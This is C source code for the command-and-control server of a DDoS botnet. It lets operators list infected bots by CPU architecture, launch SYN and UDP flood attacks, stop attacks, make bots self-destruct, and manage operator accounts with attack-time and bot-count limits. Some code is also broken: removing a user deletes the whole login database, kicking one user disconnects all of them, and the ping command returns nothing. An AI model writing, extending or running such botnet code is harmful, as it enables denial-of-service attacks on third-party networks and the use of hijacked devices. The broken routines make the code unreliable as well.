#include "headers/command_handler.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include "headers/user_handler.h"
#include "headers/attack_commands.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdbool.h>
#include <ctype.h>

int validate_ip_or_subnet(const char *ip);
void handle_openshell_command(const User *user, const char *command, int client_socket);
int is_rootuser(const char *username);
void sync_user_root_status(User *user);

static char response_buf[MAX_COMMAND_LENGTH];
static char arch_cmd_buf[512];
static int valid_bot_count = 0;

void handle_bots_command(char *response);
void handle_clear_command(char *response);
void handle_stopall_command(const User *user, char *response);
void handle_user_command(const User *user, const char *command, char *response);
void handle_adduser_command(const User *user, int client_socket);
void handle_removeuser_command(const User *user, const char *command, char *response);
void handle_kickuser_command(const User *user, const char *command, char *response);
void handle_admin_command(const User *user, char *response);
void handle_ping_command(char *response);
void handle_selfrep_command(const User *user, const char *command, char *response, const char *scanner_type, const char *action, const char *sarch);

/*
H E L P   C O M M A N D
*/
int is_rootuser(const char *username) {
    FILE *sf = fopen("options/settings.txt", "r");
    if (!sf) return 0;
    
    int is_root = 0;
    char line[256];
    while (fgets(line, sizeof(line), sf)) {
        if (strncmp(line, "rootuser:", 9) == 0) {
            char *rootusers = line + 9;
            while (*rootusers == ' ') rootusers++;
            
            char *root_copy = malloc(strlen(rootusers) + 1);
            strcpy(root_copy, rootusers);
            char *saveptr;
            char *token = strtok_r(root_copy, ",", &saveptr);
            while (token) {
                while (*token == ' ') token++;
                char *end = token + strlen(token) - 1;
                while (end > token && (*end == ' ' || *end == '\n' || *end == '\r')) {
                    *end = '\0';
                    end--;
                }
                if (strcmp(username, token) == 0) {
                    is_root = 1;
                    free(root_copy);
                    fclose(sf);
                    return is_root;
                }
                token = strtok_r(NULL, ",", &saveptr);
            }
            free(root_copy);
            break;
        }
    }
    fclose(sf);
    return is_root;
}

void sync_user_root_status(User *user) {
    if (!user) return;
    user->is_root = is_rootuser(user->user);
}

void handle_help_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             RED "!misc" YELLOW " - " GRAY "shows misc commands\r\n"
             RED "!attack" YELLOW " - " GRAY "shows attack methods\r\n"
             RED "!admin" YELLOW " - " GRAY "show admin and root commands\r\n"
             RED "!help" YELLOW " - " GRAY  "shows this msg\r\n" RESET);
}

/*
M I S C   C O M M A N D S
*/
void handle_misc_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             RED "!opthelp" YELLOW " - " GRAY "see attack options\r\n"
             RED "!bots" YELLOW " - " GRAY "list bots\r\n"
             RED "!user" YELLOW " - " GRAY "show user or other users\r\n"
             RED "!clear" YELLOW " - " GRAY "clear screen\r\n"
             RED "!stopall" YELLOW " - " GRAY "stops all atks\r\n"
             RED "!exit" YELLOW " - " GRAY "leave CNC\r\n" RESET);
}

/*
ATK LIST   C O M M A N D
*/
void handle_attack_list_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             RED  "!syn" YELLOW " - " GRAY "TCP Flood with SYN+PSH Flags\r\n"
             RED "!udpplain" YELLOW " - " GRAY "Classic UDP Flood.\r\n" RESET);
}

/*
OPTHELP   C O M M A N D
*/
void handle_opthelp_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             RESET "Optional Arguments:\r\n"
             RED "usleep" YELLOW " - " GRAY "Select delay (usleep=min-max or usleep=delay)\r\n"
             RED "msg" YELLOW " - " GRAY "select static msg for attack (if not = rand hex)\r\n"
             RED "bot" YELLOW " - " GRAY "select specific bot for kill\r\n"
             RED "sarch" YELLOW " - " GRAY "select from arch group\r\n"
             RED "psize" YELLOW " - " GRAY "Packet len, psize=min-max or psize= | max: 1500\r\n"
             RED "srcport" YELLOW " - " GRAY "Src port for SYN | Default=Random\r\n"
             RED "botcount" YELLOW " - " GRAY "Limit number of bots to use\r\n");
}

void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {
    if (strlen(command) == 0) return;

    log_command(user->user, user_ip, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response_buf, sizeof(response_buf), RESET "\rGlobal cooldown still active for " YELLOW "%d seconds" RESET "\n", global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strncmp(command, "!kill", 5) == 0) {
        if (!user->is_admin) {
            snprintf(response_buf, sizeof(response_buf), RED "Only admins can use !kill command\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        char sarch[32] = {0};
        char bot_ip[64] = {0};
        int has_sarch = 0, has_botip = 0, unknown_arg = 0;
        if (strlen(command) > 5) {
            char *args = (char *)(command + 5);
            while (*args == ' ') args++;
            char *token = strtok(args, " ");
            while (token) {
                if (strncmp(token, "sarch=", 6) == 0) {
                    strncpy(sarch, token + 6, sizeof(sarch) - 1);
                    sarch[sizeof(sarch) - 1] = 0;
                    has_sarch = 1;
                } else if (strncmp(token, "bot=", 4) == 0) {
                    strncpy(bot_ip, token + 4, sizeof(bot_ip) - 1);
                    bot_ip[sizeof(bot_ip) - 1] = 0;
                    has_botip = 1;
                } else if (strlen(token) > 0) {
                    unknown_arg = 1;
                }
                token = strtok(NULL, " ");
            }
        }
        if (unknown_arg) {
            snprintf(response_buf, sizeof(response_buf), RED "Unknown argument for !kill. only sarch=, bot=x.x.x.x allowed\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        static const char* known_archs[] = {"arc", "powerpc", "sh4", "mips", "mipsel", "x86_64", "m68k", "sparc", "i486", "aarch64", "armv4l", "armv5l", "armv6l", "armv7l"};
        if (has_sarch) {
            int valid_arch = 0;
            for (size_t k = 0; k < sizeof(known_archs)/sizeof(known_archs[0]); k++) {
                if (strcmp(sarch, known_archs[k]) == 0) { valid_arch = 1; break; }
            }
            if (!valid_arch) {
                snprintf(response_buf, sizeof(response_buf), RED "Invalid arch for sarch=\n" RESET);
                send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
                return;
            }
        }
        pthread_mutex_lock(&bot_mutex);
        int sent_bots = 0;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int arch_match = 1;
            int ip_match = 1;
            if (has_sarch) {
                arch_match = 0;
                char *saveptr1;
                char sarch_copy[128];
                strncpy(sarch_copy, sarch, sizeof(sarch_copy)-1);
                sarch_copy[sizeof(sarch_copy)-1] = 0;
                char *tok = strtok_r(sarch_copy, ",", &saveptr1);
                while (tok) {
                    if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                    tok = strtok_r(NULL, ",", &saveptr1);
                }
                if (!arch_match) continue;
            }
            if (has_botip) {
                char ipstr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &bots[i].address.sin_addr, ipstr, sizeof(ipstr));
                if (strcmp(ipstr, bot_ip) != 0) continue;
            }
            sent_bots++;
        }
        pthread_mutex_unlock(&bot_mutex);
        if (sent_bots == 0) {
            snprintf(response_buf, sizeof(response_buf), RED "\rNo matching bots found\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        char confirm_msg[128];
        snprintf(confirm_msg, sizeof(confirm_msg), YELLOW "\rAre you sure you want to kill %d bots? Y to proceed: " RESET, sent_bots);
        send(client_socket, confirm_msg, strlen(confirm_msg), MSG_NOSIGNAL);
        
        char confirm_buf[8] = {0};
        ssize_t confirm_len = recv(client_socket, confirm_buf, sizeof(confirm_buf)-1, 0);
        
        int confirmed = 0;
        if (confirm_len > 0) {
            for (int i = 0; i < confirm_len; i++) {
                if (confirm_buf[i] == 'Y' || confirm_buf[i] == 'y') {
                    confirmed = 1;
                    break;
                }
            }
        }
        
        if (!confirmed) {
            snprintf(response_buf, sizeof(response_buf), RED "\rAborted. No bots killed\r\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_lock(&bot_mutex);
        int killed_bots = 0;
        int i = 0;
        while (i < bot_count) {
            if (!bots[i].is_valid) { i++; continue; }
            int arch_match = 1;
            int ip_match = 1;
            if (has_sarch) {
                arch_match = 0;
                char *saveptr1;
                char sarch_copy[128];
                strncpy(sarch_copy, sarch, sizeof(sarch_copy)-1);
                sarch_copy[sizeof(sarch_copy)-1] = 0;
                char *tok = strtok_r(sarch_copy, ",", &saveptr1);
                while (tok) {
                    if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                    tok = strtok_r(NULL, ",", &saveptr1);
                }
                if (!arch_match) { i++; continue; }
            }
            if (has_botip) {
                char ipstr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &bots[i].address.sin_addr, ipstr, sizeof(ipstr));
                if (strcmp(ipstr, bot_ip) != 0) { i++; continue; }
            }
            send(bots[i].socket, "!kill", 5, MSG_NOSIGNAL);
            cleanup_socket(&bots[i].socket);
            bots[i].is_valid = 0;
            killed_bots++;
            for (int j = i + 1; j < bot_count; j++) bots[j-1] = bots[j];
            bot_count--;
        }
        pthread_mutex_unlock(&bot_mutex);
        snprintf(response_buf, sizeof(response_buf), GREEN "terminated %d bots\\n" RESET, killed_bots);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }

    if (strcmp(command, "!help") == 0) {
        handle_help_command(response_buf);
    } else if (strcmp(command, "!misc") == 0) {
        handle_misc_command(response_buf);
    } else if (strcmp(command, "!admin") == 0) {
        handle_admin_command(user, response_buf);
    } else if (strcmp(command, "!attack") == 0) {
        handle_attack_list_command(response_buf);
    } else if (strcmp(command, "!bots") == 0) {
        handle_bots_command(response_buf);
    } else if (strcmp(command, "!ping") == 0) {
        handle_ping_command(response_buf);
    } else if (strcmp(command, "!clear") == 0) {
        handle_clear_command(response_buf);
    }else if (strcmp(command, "!opthelp") == 0) {
        handle_opthelp_command(response_buf);
    } else if (strcmp(command, "!exit") == 0) {
        snprintf(response_buf, sizeof(response_buf), YELLOW "\rGoodbye!\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        close(client_socket);
        return;
    } else if (strncmp(command, "!user", 5) == 0) {
        handle_user_command(user, command, response_buf);
    } else if (strcmp(command, "!adduser") == 0) {
        handle_adduser_command(user, client_socket);
        return;
    } else if (strncmp(command, "!removeuser", 10) == 0) {
        handle_removeuser_command(user, command, response_buf);
    } else if (strncmp(command, "!kickuser", 9) == 0) {
        handle_kickuser_command(user, command, response_buf);
    } else if (strncmp(command, "!udpplain", 9) == 0) {
        handle_udpplain_command(user, command, response_buf);
    } else if (strncmp(command, "!syn", 4) == 0) {
        handle_syn_command(user, command, response_buf);
    } else if (strcmp(command, "!stopall") == 0) {
        handle_stopall_command(user, response_buf);
    } else {
        snprintf(response_buf, sizeof(response_buf), RESET "\rCommand not found\n" RESET);
    }

    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
}

void handle_bots_command(char *response) {
    #define NUM_ARCHS 16
    static int arch_count[NUM_ARCHS];
    static const char* arch_names[] = {"arc", "powerpc", "sh4", "mips", "mipsel", "x86_64", "m68k", "sparc", "i486", "aarch64", "armv4l", "armv5l", "armv6l", "armv7l", "unknown"};
    static int valid_bots;
    int offset;
    
    memset(arch_count, 0, sizeof(arch_count));
    valid_bots = 0;
    
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        
        int is_duplicate = 0;
        for (int j = 0; j < i; j++) {
            if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
                is_duplicate = 1;
                break;
            }
        }
        if (is_duplicate) continue;
        
        valid_bots++;
        int found = 0;
        for (int j = 0; j < NUM_ARCHS-1 && !found; j++) {
            if (bots[i].arch != NULL && strcmp(bots[i].arch, arch_names[j]) == 0) {
                arch_count[j]++;
                found = 1;
            }
        }
        if (!found) {
            arch_count[NUM_ARCHS-1]++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "Total bots: " RESET "%d\n", valid_bots);
    for (int i = 0; i < NUM_ARCHS; i++) {
        if (arch_count[i] > 0) {
            const char *arch_name = arch_names[i] ? arch_names[i] : "unknown";
            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, LIGHT_BLUE "\r%s: " RESET "%d\r\n", arch_name, arch_count[i]);
        }
    }
}

void handle_clear_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH, "\033[H\033[J");
}

void handle_stopall_command(const User *user, char *response) {
    static int allow_stopall;
    static int stopped_count;
    static const char stop_cmd[] = "stop";
    
    allow_stopall = 0;
    stopped_count = 0;
    
    if (user->is_admin) {
        allow_stopall = 1;
    } else {
        FILE* sf = fopen("options/settings.txt", "r");
        if (sf) {
            char line[128] = {0};
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0) {
                    allow_stopall = strstr(line, "yes") ? 1 : 0;
                    break;
                }
            }
            fclose(sf);
        }
    }

    if (!allow_stopall) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Error: You don't have permission to use !stopall\n" RESET);
        return;
    }

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) {
            if (send(bots[i].socket, stop_cmd, strlen(stop_cmd), MSG_NOSIGNAL) > 0) {
                stopped_count++;
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    
    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = 0;
    pthread_mutex_unlock(&cooldown_mutex);
    
    snprintf(response, MAX_COMMAND_LENGTH, "\r" GREEN "Sent stop command to %d active bots\n" RESET, stopped_count);
}

void handle_user_command(const User *user, const char *command, char *response) {
    if (!user->is_admin) {
        FILE *sf = fopen("options/settings.txt", "r");
        int allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalusercommand:", 17) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, RESET "\ronly admins can use !user command\r\n" RESET);
            return;
        }
    }
    
    char target_user[50] = {0};
    if (sscanf(command, "!user %49s", target_user) == 1) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(users[i].user, target_user) == 0) {
                int is_connected = (user_sockets[i] > 0) ? 1 : 0;
                snprintf(response, MAX_COMMAND_LENGTH,
                    YELLOW "Username: %s\r\n"
                    "Max time: %d\r\n"
                    "Max bots: %d\r\n"
                    "Root: %s\r\n"
                    "Admin: %s\r\n"
                    "Connected: %s\r\n" RESET,
                    users[i].user,
                    users[i].maxtime,
                    users[i].maxbots,
                    users[i].is_root ? "yes" : "no",
                    users[i].is_admin ? "yes" : "no",
                    is_connected ? "yes" : "no");
                found = 1;
                break;
            }
        }
        if (!found) {
            snprintf(response, MAX_COMMAND_LENGTH, RESET "User not found\r\n" RESET);
        }
    } else {
        snprintf(response, MAX_COMMAND_LENGTH,
            GREEN "Username: %s\r\n"
            "Max time: %d\r\n"
            "Max bots: %d\r\n"
            "Root: %s\r\n"
            "Admin: %s\r\n"
            "Connected: yes\r\n" RESET,
            user->user,
            user->maxtime,
            user->maxbots,
            user->is_root ? "yes" : "no",
            user->is_admin ? "yes" : "no");
    }
}


void handle_adduser_command(const User *user, int client_socket) {
    static char response[MAX_COMMAND_LENGTH];
    static char buffer[128];
    static char newuser[50];
    static char newpass[50];
    static char tmp[256];
    static int maxtime, maxbots, is_admin;
    static ssize_t len;
    memset(newuser, 0, sizeof(newuser));
    memset(newpass, 0, sizeof(newpass));
    
    if (!is_rootuser(user->user)) {
        snprintf(response, sizeof(response), RESET "Only root user can add users\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), CYAN "\rUsername: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int uidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + uidx, sizeof(buffer) - 1 - uidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = uidx; i < uidx + len; i++) {
            if (buffer[i] == '\r' || buffer[i] == '\n') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        uidx += len;
        if (found) break;
        if (uidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0) {
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);
    }
    uidx = 0;
    for (int i = 0; buffer[i] && uidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_') {
            newuser[uidx++] = c;
        }
    }
    newuser[uidx] = 0;
    if (strlen(newuser) < 3) {
        snprintf(response, sizeof(response), RESET "\r\nUsername must be at least 3 characters\r\n\r\n" RESET BLUE "Username: " RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, newuser) == 0) {
            snprintf(response, sizeof(response), RESET "\r\nUser already exists\r\n\r\n" RESET BLUE "Username: " RESET);
            send(client_socket, response, strlen(response), MSG_NOSIGNAL);
            return;
        }
    }
    snprintf(response, sizeof(response), CYAN "\rPassword: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int pidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + pidx, sizeof(buffer) - 1 - pidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = pidx; i < pidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        pidx += len;
        if (found) break;
        if (pidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0) {
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);
    }
    pidx = 0;
    for (int i = 0; buffer[i] && pidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if (c >= 32 && c <= 126) {
            newpass[pidx++] = c;
        }
    }
    newpass[pidx] = 0;
    if (strlen(newpass) < 4) {
        snprintf(response, sizeof(response), RESET "\rPassword must be at least 4 characters\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), CYAN "\rAdmin? (y/n): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int adminidx = 0;
    memset(buffer, 0, sizeof(buffer));
    is_admin = 0;
    while (1) {
        len = recv(client_socket, buffer + adminidx, sizeof(buffer) - 1 - adminidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = adminidx; i < adminidx + len; i++) {
            char c = buffer[i];
            if (c == 'y' || c == 'Y') {
                is_admin = 1;
                found = 1;
                break;
            } else if (c == 'n' || c == 'N') {
                is_admin = 0;
                found = 1;
                break;
            } else if (c < 32 || c == 127) {
                found = 1;
                break;
            }
        }
        adminidx += len;
        if (found) break;
        if (adminidx >= (int)sizeof(buffer) - 1) return;
    }
    snprintf(response, sizeof(response), CYAN "\rMax attack time (seconds): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int timeidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + timeidx, sizeof(buffer) - 1 - timeidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = timeidx; i < timeidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        timeidx += len;
        if (found) break;
        if (timeidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0) {
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);
    }
    buffer[strcspn(buffer, "\r\n")] = 0;
    if (sscanf(buffer, "%d", &maxtime) != 1 || maxtime <= 0) {
        snprintf(response, sizeof(response), RESET "Invalid max time value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), CYAN "\rMax bots: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int botsidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + botsidx, sizeof(buffer) - 1 - botsidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = botsidx; i < botsidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        botsidx += len;
        if (found) break;
        if (botsidx >= (int)sizeof(buffer) - 1) return;
    }
    while (recv(client_socket, &tmp, 1, MSG_DONTWAIT | MSG_PEEK) > 0) {
        recv(client_socket, &tmp, 1, MSG_DONTWAIT);
    }
    buffer[strcspn(buffer, "\r\n")] = 0;
    if (sscanf(buffer, "%d", &maxbots) != 1 || maxbots <= 0) {
        snprintf(response, sizeof(response), RESET "Invalid max bots value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    FILE *fp = fopen("database/logins.txt", "a");
    if (!fp) {
        snprintf(response, sizeof(response), RESET "Error: Could not open user database\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    
    fprintf(fp, "\n%s %s %d %d %s", newuser, newpass, maxtime, maxbots, is_admin ? "admin" : "0");
    fclose(fp);

    if (user_count < MAX_USERS) {
        strncpy(users[user_count].user, newuser, sizeof(users[user_count].user)-1);
        users[user_count].user[sizeof(users[user_count].user)-1] = 0;
        strncpy(users[user_count].pass, newpass, sizeof(users[user_count].pass)-1);
        users[user_count].pass[sizeof(users[user_count].pass)-1] = 0;
        users[user_count].maxtime = maxtime;
        users[user_count].maxbots = maxbots;
        users[user_count].is_admin = is_admin;
        users[user_count].is_logged_in = 0;
        user_count++;
    }

    snprintf(response, sizeof(response), 
        YELLOW "User added successfully:\r\n"
        "Username: " RESET "%s" YELLOW "\r\n"
        "Max time: " RESET "%d" YELLOW "\r\n"
        "Max bots: " RESET "%d" YELLOW "\r\n"
        "Admin: " RESET "%s" YELLOW "\r\n" RESET,
        newuser, maxtime, maxbots, is_admin ? "yes" : "no");
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
}

void handle_removeuser_command(const User *user, const char *command, char *response) {
    if (!is_rootuser(user->user)) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Only root user can remove users\r\n" RESET);
        return;
    }    char target[50];
    if (sscanf(command, "!removeuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Usage: !removeuser <username>\r\n" RESET);
        return;
    }

    int found = 0;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) {
            found = 1;
            break;
        }
    }
    if (!found) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "User does not exist\r\n" RESET);
        return;
    }
    if (is_rootuser(target)) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Cannot remove root user\r\n" RESET);
        return;
    }

    FILE *f = fopen("database/logins.txt", "r");
    FILE *temp = fopen("database/logins.tmp", "w");
    if (!f || !temp) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Failed to remove user\r\n" RESET);
        if (f) fclose(f);
        if (temp) fclose(temp);
        return;
    }

    char line[256];
    int removed = 0;
    while (fgets(line, sizeof(line), f)) {
        char current[50];
        if (sscanf(line, "%49s", current) == 1) {
            if (strcmp(current, target) != 0) {
                fputs(line, temp);
            } else {
                removed = 1;
            }
        }
    }

    fclose(f);
    fclose(temp);

    if (removed) {
        remove("database/logins.txt");
        rename("database/logins.txt", "database/logins.txt");
        load_users();
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User %s removed\r\n" RESET, target);
    } else {
        remove("logins.tmp");
        snprintf(response, MAX_COMMAND_LENGTH, RESET "User not found\r\n" RESET);
    }
}

void handle_kickuser_command(const User *user, const char *command, char *response) {
    static char target[50];
    static int allow_non_admin;
    static int found;
    
    if (!user->is_admin) {
        FILE *sf = fopen("options/settings.txt", "r");
        allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, RESET "Error: You need to be admin or have globalstopall enabled to kick users\r\n" RESET);
            return;
        }
    }

    if (sscanf(command, "!kickuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Usage: !kickuser <username>\r\n" RESET);
        return;
    }

    found = 0;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) {
            if (!users[i].is_logged_in) {
                snprintf(response, MAX_COMMAND_LENGTH, RESET "User not connected\r\n" RESET);
                return;
            }
            for (int j = 0; j < MAX_USERS; j++) {
                if (user_sockets[j] > 0) {
                    shutdown(user_sockets[j], SHUT_RDWR);
                    close(user_sockets[j]);
                    user_sockets[j] = 0;
                }
            }
            users[i].is_logged_in = 0;
            found = 1;
            break;
        }
    }

    if (found) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Kicked user %s\r\n" RESET, target);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "User not found\r\n" RESET);
    }
}

void handle_admin_command(const User *user, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Only admins can use !admin command\r\n" RESET);
        return;
    }
    snprintf(response, MAX_COMMAND_LENGTH,
             RED "!adduser" YELLOW " - " GRAY "Add a new user\r\n"
             RED "!removeuser" YELLOW " - " GRAY "Remove a user\r\n"
             RED "!kill" YELLOW " - " GRAY "kicks/triggers self destruct on bots\r\n"
             RED "!kickuser" YELLOW " - " GRAY "Kick a connected user\r\n" RESET);
}

void handle_ping_command(char *response) {
    int valid_bots = 0;
    pthread_mutex_lock(&bot_mutex);
    int count = bot_count;
    if (count > MAX_BOTS) count = MAX_BOTS;
    for (int i = 0; i < count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
    }
    pthread_mutex_unlock(&bot_mutex);
}




int validate_ip_or_subnet(const char *ip) {
    char buf[32];
    strncpy(buf, ip, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *slash = strchr(buf, '/');
    if (slash) {
        *slash = 0;
        int cidr = atoi(slash+1);
        if (cidr < 1 || cidr > 32) return 0;
    }
    struct in_addr addr;
    return inet_aton(buf, &addr);
}